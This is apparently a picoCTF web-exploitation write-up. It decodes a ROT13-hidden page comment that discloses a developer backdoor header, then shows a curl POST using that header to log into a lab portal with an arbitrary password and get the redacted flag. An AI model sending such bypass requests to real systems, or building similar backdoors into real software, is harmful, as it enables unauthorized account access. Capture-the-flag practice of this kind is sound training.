**Web Exploitation**
```

We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: `ctf-player@picoctf.org`. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?

Additional details will be available after launching your challenge instance.

```

---
# Solve

#### S 1
**In the page source we have comment**

#### S 2
```bash
 echo `<Commant>` | tr 'a-z' 'n-za-m' | tr 'A-Z' 'N-ZA-M'
```
>` NOTE: Jack - temporary bypass: use header X-Dev-Access: yes`


#### S 3
Command:
```Bash
curl  <Url> \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://amiable-citadel.picoctf.net:58418/' \
  -H 'Origin: http://amiable-citadel.picoctf.net:58418' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Priority: u=0' \
  -H 'X-Dev-Access: yes' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  --data-raw '{"email":"ctf-player@picoctf.org","password":"ersd"}'
  ```
> `{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{<Flag>}"}`
# Finish